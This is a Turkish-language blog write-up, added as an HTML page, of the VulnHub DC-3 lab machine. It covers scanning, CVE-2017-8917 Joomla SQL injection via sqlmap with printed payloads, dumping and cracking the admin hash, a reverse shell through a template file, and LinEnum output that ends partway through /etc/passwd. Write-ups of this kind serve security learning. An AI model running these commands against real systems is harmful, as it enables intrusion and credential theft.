@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Barcode">
+<meta name="description" content="Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip; 😊
+1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
+netdiscover -i eth1  Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.
+sudo nmap -sV -sC -p- 192.168.56.111  80 portunda çalışan web servisine tarayıcından istek atılır." />
+<meta name="keywords" content=", Vulnhub, write-up, joomla, sqlinjection, sqlmap, CVE-2017-8917, CVE-2016-4557" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/" />
+
+
+    <title>
+        
+            VULNHUB DC-3 Write Up :: Cyber Security Blog  — Welcome the My Blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://barcode91.github.io/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+    
+        <link rel="stylesheet" type="text/css" href="https://barcode91.github.io/css/scroll.css">
+    
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://barcode91.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://barcode91.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://barcode91.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://barcode91.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://barcode91.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://barcode91.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="VULNHUB DC-3 Write Up">
+<meta itemprop="description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-32,312/) &#39;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...">
+<meta itemprop="datePublished" content="2020-09-29T13:06:24+03:00" />
+<meta itemprop="dateModified" content="2020-09-29T16:00:35+03:00" />
+<meta itemprop="wordCount" content="1710">
+<meta itemprop="image" content="https://barcode91.github.io"/>
+
+
+
+<meta itemprop="keywords" content="Vulnhub,write-up,joomla,sqlinjection,sqlmap,CVE-2017-8917,CVE-2016-4557," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://barcode91.github.io"/>
+
+<meta name="twitter:title" content="VULNHUB DC-3 Write Up"/>
+<meta name="twitter:description" content="Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-32,312/) &#39;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."/>
+
+
+
+
+
+    <meta property="article:section" content="write-up" />
+
+
+
+    <meta property="article:published_time" content="2020-09-29 13:06:24 &#43;0300 &#43;03" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <style>
+
+    span.headwidth{
+     width: 860px;
+    }
+
+
+</style>
+<header class="header">
+    <span class="header__inner headwidth">
+        <a href="https://barcode91.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text"> root@Barcode#</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://barcode91.github.io/categories/cyber-security/">Cyber Security</a></li><li><a href="https://barcode91.github.io/categories/network/">Network</a></li><li><a href="https://barcode91.github.io/categories/write-up/">Write-up</a></li><li><a href="https://barcode91.github.io/about/">About</a></li><li><a href="https://barcode91.github.io/categories/">Categories</a></li><li><a href="https://barcode91.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+<style>
+ 
+
+</style>
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://barcode91.github.io/posts/2020/09/vulnhub-dc-3-write-up/">VULNHUB DC-3 Write Up</a>
+      </h1>
+
+      
+        <img src="https://barcode91.github.io/images/vulnhub/dc3/cover.png" class="center cover" />
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-keşif-aşaması">1. Keşif Aşaması</a></li>
+    <li><a href="#2-erişim-sağlanması">2. Erişim Sağlanması</a></li>
+    <li><a href="#3-yetki-yükseltme">3. Yetki Yükseltme</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        
+        <p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/dc-32,312/">VULNHUB</a> &lsquo;da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip; 😊</p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth1
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -p- 192.168.56.111
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>80 portunda çalışan web servisine tarayıcından istek atılır. Sayfa kaynak kodu incelendiğinde Joomla CMS uygulamasının çalıştığı görülmektedir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/web.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Web dizin taraması gerçekleştirilir. Ayrıca google&rsquo;da arama yapıldığında <em><strong>administrator/manifests/files/joomla.xml</strong></em> içerisnde uygulama sürümü hakkında bilgi yer aldığı tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://192.168.56.111 -w /usr/share/wordlists/dirb/big.txt
+</code></pre></div><pre><code class="language-terminal" data-lang="terminal">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.56.111
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/28 13:46:56 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/administrator (Status: 301)
+/bin (Status: 301)
+/cache (Status: 301)
+/cli (Status: 301)
+/components (Status: 301)
+/images (Status: 301)
+/includes (Status: 301)
+/language (Status: 301)
+/layouts (Status: 301)
+/libraries (Status: 301)
+/media (Status: 301)
+/modules (Status: 301)
+/plugins (Status: 301)
+/server-status (Status: 403)
+/templates (Status: 301)
+/tmp (Status: 301)
+===============================================================
+2020/09/28 13:47:00 Finished
+===============================================================
+</code></pre><p>Web dizin taramasında joomla uygulamasının standart dosyaları dışında bir dosya tespit edilememektedir.</p>
+<p>http://192.168.56.111/administrator/manifests/files/joomla.xml adresine istek atılırak sürüm bilgisi tespit edilir. Sürümün 3.7.0 olduğu görülmektedir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+<span style="color:#f92672">&lt;extension</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.6&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;upgrade&#34;</span><span style="color:#f92672">&gt;</span>
+	<span style="color:#f92672">&lt;name&gt;</span>files_joomla<span style="color:#f92672">&lt;/name&gt;</span>
+	<span style="color:#f92672">&lt;author&gt;</span>Joomla! Project<span style="color:#f92672">&lt;/author&gt;</span>
+	<span style="color:#f92672">&lt;authorEmail&gt;</span>admin@joomla.org<span style="color:#f92672">&lt;/authorEmail&gt;</span>
+	<span style="color:#f92672">&lt;authorUrl&gt;</span>www.joomla.org<span style="color:#f92672">&lt;/authorUrl&gt;</span>
+	<span style="color:#f92672">&lt;copyright&gt;</span>(C) 2005 - 2017 Open Source Matters. All rights reserved<span style="color:#f92672">&lt;/copyright&gt;</span>
+	<span style="color:#f92672">&lt;license&gt;</span>GNU General Public License version 2 or later; see LICENSE.txt<span style="color:#f92672">&lt;/license&gt;</span>
+	<span style="color:#f92672">&lt;version&gt;</span>3.7.0<span style="color:#f92672">&lt;/version&gt;</span>
+	<span style="color:#f92672">&lt;creationDate&gt;</span>April 2017<span style="color:#f92672">&lt;/creationDate&gt;</span>
+	<span style="color:#f92672">&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style="color:#f92672">&lt;/description&gt;</span>
+
+	<span style="color:#f92672">&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style="color:#f92672">&lt;/scriptfile&gt;</span>
+
+....
+</code></pre></div><p>Joomla sürümünün güncel olmadığı görülmektedir. Searchsploit ile exploit araması yapılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">searchsploit joomla 3.7
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+Joomla! 3.7 - SQL Injection                   | php/remote/44227.php
+Joomla! 3.7.0 - <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection    | php/webapps/42033.txt
+Joomla! Component ARI Quiz 3.7.4 - SQL Inject | php/webapps/46769.txt
+Joomla! Component com_realestatemanager 3.7 - | php/webapps/38445.txt
+Joomla! Component Easydiscuss &lt; 4.0.21 - Cros | php/webapps/43488.txt
+Joomla! Component J2Store &lt; 3.3.7 - SQL Injec | php/webapps/46467.txt
+Joomla! Component JomEstate PRO 3.7 - <span style="color:#e6db74">&#39;id&#39;</span> SQ | php/webapps/44117.txt
+Joomla! Component Jtag Members Directory 5.3. | php/webapps/43913.txt
+Joomla! Component Quiz Deluxe 3.7.4 - SQL Inj | php/webapps/42589.txt
+---------------------------------------------- ---------------------------------
+</code></pre></div><p>İkinci sırada yer alan exploit -m parametresi ile indirilip incelenir. Uygulamada SqlInjection zafiyeti oluğu görülmektedir. Sqlmap aracı kullanılarak zafiyet sömürülür.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27
+
+
+Using Sqlmap: 
+
+sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Parameter: list[fullordering] (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (DUAL)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
+</code></pre></div><p>İlk olarak veritabanları tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/sqlmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Tespit edilen joomla veritabanı seçilerek, veritabanında yer alan tablolar tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb --tables -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
+[76 tables]
++---------------------+
+| #__assets           |
+| #__associations     |
+| #__banner_clients   |
+| #__banner_tracks    |
+| #__banners          |
+| #__bsms_admin       |
+| #__bsms_books       |
+| #__bsms_comments    |
+| #__bsms_locations   |
+| #__bsms_mediafiles  |
+| #__bsms_message_typ |
+| #__bsms_podcast     |
+| #__bsms_series      |
+| #__bsms_servers     |
+| #__bsms_studies     |
+| #__bsms_studytopics |
+| #__bsms_teachers    |
+| #__bsms_templatecod |
+| #__bsms_templates   |
+| #__bsms_timeset     |
+| #__bsms_topics      |
+| #__bsms_update      |
+| #__categories       |
+| #__contact_details  |
+| #__content_frontpag |
+| #__content_rating   |
+| #__content_types    |
+| #__content          |
+| #__contentitem_tag_ |
+| #__core_log_searche |
+| #__extensions       |
+| #__fields_categorie |
+| #__fields_groups    |
+| #__fields_values    |
+| #__fields           |
+| #__finder_filters   |
+| #__finder_links_ter |
+| #__finder_links     |
+| #__finder_taxonomy_ |
+| #__finder_taxonomy  |
+| #__finder_terms_com |
+| #__finder_terms     |
+| #__finder_tokens_ag |
+| #__finder_tokens    |
+| #__finder_types     |
+| #__jbsbackup_timese |
+| #__jbspodcast_times |
+| #__languages        |
+| #__menu_types       |
+| #__menu             |
+| #__messages_cfg     |
+| #__messages         |
+| #__modules_menu     |
+| #__modules          |
+| #__newsfeeds        |
+| #__overrider        |
+| #__postinstall_mess |
+| #__redirect_links   |
+| #__schemas          |
+| #__session          |
+| #__tags             |
+| #__template_styles  |
+| #__ucm_base         |
+| #__ucm_content      |
+| #__ucm_history      |
+| #__update_sites_ext |
+| #__update_sites     |
+| #__updates          |
+| #__user_keys        |
+| #__user_notes       |
+| #__user_profiles    |
+| #__user_usergroup_m |
+| #__usergroups       |
+| #__users            |
+| #__utf8_conversion  |
+| #__viewlevels       |
++---------------------+
+</code></pre></div><p>Joomla veritabanında yer alan <em><strong>#__users</strong></em> tablosunda yer alan kolonlar tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> --columns -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Database: joomladb
+Table: #__users
+[6 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | numeric     |
+| name     | non-numeric |
+| password | non-numeric |
+| email    | non-numeric |
+| params   | non-numeric |
+| username | non-numeric |
++----------+-------------+
+</code></pre></div><p>Tablodaki username,password ve email sutunlarında yer alan bilgiler dump edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://192.168.56.111/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D joomladb -T <span style="color:#e6db74">&#39;#__users&#39;</span> -C username,password,email --dump -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Database: joomladb
+Table: #__users
+[1 entry]
++----------+--------------------------------------------------------------+--------------------------+
+| username | password                                                     | email                    |
++----------+--------------------------------------------------------------+--------------------------+
+| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | freddy@norealaddress.net |
++----------+--------------------------------------------------------------+--------------------------+
+</code></pre></div><p>Admin kullanıcısına ait hash bilgisi elde edilmektedir. Elde edilen hash bilgisi hashcat aracı ile sözlük saldırısı yapılarak kırılır. Elde edilen hash türü tespit edilir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/hashcatt.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">3200</span> --force hash.txt /usr/share/wordlists/rockyou.txt 
+</code></pre></div>
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/hashcat.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Admin kullancısı ile sisteme giriş yapılır. Daha sonra template içerisinde yer alan protostar temasındaki error.php dosyası reverse shell alacak şekilde düzenlenir.</p>
+
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/login.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><em>http://192.168.56.111/template/protostar/error.php</em> adresine istek atılarak ncat ile dinlenen porta bağlantı sağlanılır.</p>
+<p>
+    <img src="https://barcode91.github.io/images/vulnhub/dc3/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />
+
+
+Python pty modulü kullanılarak etkileşimli kabuğa geçilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</code></pre></div><h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p>Yetki yükseltmek için LinEnum betiği kullanılırak sistem hakkında bilgi toplanır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#########################################################</span>
+<span style="color:#75715e"># Local Linux Enumeration &amp; Privilege Escalation Script #</span>
+<span style="color:#75715e">#########################################################</span>
+<span style="color:#75715e"># www.rebootuser.com</span>
+<span style="color:#75715e"># version 0.982</span>
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Debug Info
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Thorough tests <span style="color:#f92672">=</span> Disabled
+
+
+Scan started at:
+Tue Sep <span style="color:#ae81ff">29</span> 08:00:57 AEST <span style="color:#ae81ff">2020</span>
+
+
+<span style="color:#75715e">### SYSTEM ##############################################</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information:
+Linux DC-3 4.4.0-21-generic <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kernel information <span style="color:#f92672">(</span>continued<span style="color:#f92672">)</span>:
+Linux version 4.4.0-21-generic <span style="color:#f92672">(</span>buildd@lgw01-06<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>gcc version 5.3.1 <span style="color:#ae81ff">20160413</span> <span style="color:#f92672">(</span>Ubuntu 5.3.1-14ubuntu2<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> <span style="color:#75715e">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Specific release information:
+DISTRIB_ID<span style="color:#f92672">=</span>Ubuntu
+DISTRIB_RELEASE<span style="color:#f92672">=</span>16.04
+DISTRIB_CODENAME<span style="color:#f92672">=</span>xenial
+DISTRIB_DESCRIPTION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
+NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu&#34;</span>
+VERSION<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04 LTS (Xenial Xerus)&#34;</span>
+ID<span style="color:#f92672">=</span>ubuntu
+ID_LIKE<span style="color:#f92672">=</span>debian
+PRETTY_NAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Ubuntu 16.04 LTS&#34;</span>
+VERSION_ID<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;16.04&#34;</span>
+HOME_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.ubuntu.com/&#34;</span>
+SUPPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://help.ubuntu.com/&#34;</span>
+BUG_REPORT_URL<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bugs.launchpad.net/ubuntu/&#34;</span>
+UBUNTU_CODENAME<span style="color:#f92672">=</span>xenial
+
+<span style="color:#75715e">### USER/GROUP ##########################################</span>
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Current user/group info:
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> It looks like we have some admin users:
+uid<span style="color:#f92672">=</span>104<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>108<span style="color:#f92672">(</span>syslog<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dc3<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,117<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,118<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
+
+
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Contents of /etc/passwd:
+root❌0:0:root:/root:/bin/bash
+daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin❌2:2:bin:/bin:/usr/sbin/nologin
+sys❌3:3:sys:/dev:/usr/sbin/nologin
+sync❌4:65534:sync:/bin:/bin/sync
+games❌5:60:games:/usr/games:/usr/sbin/nologin
+man❌6:12:man:/var/cache/man:/usr/sbin/nologin
+lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail❌8:8:mail:/var/mail:/usr/sbin/nologin
+news❌9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy❌13:13:proxy:/bin:/usr/sbin/nologin
+www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
+backup❌34:34:backup:/var/backups:/usr/sbin/nologin
+list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats❌41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog❌104:108::/home/syslog:/bin/false
+_apt❌105:65534::/nonexistent:/bin/false
+lxd❌106:65534::/var/lib/lxd/:/bin/false
+mysql❌107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus❌108:112::/var/run/dbus:/bin/false
+uuidd❌109:113::/run/uuidd:/bin/false
+dnsmasq❌110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
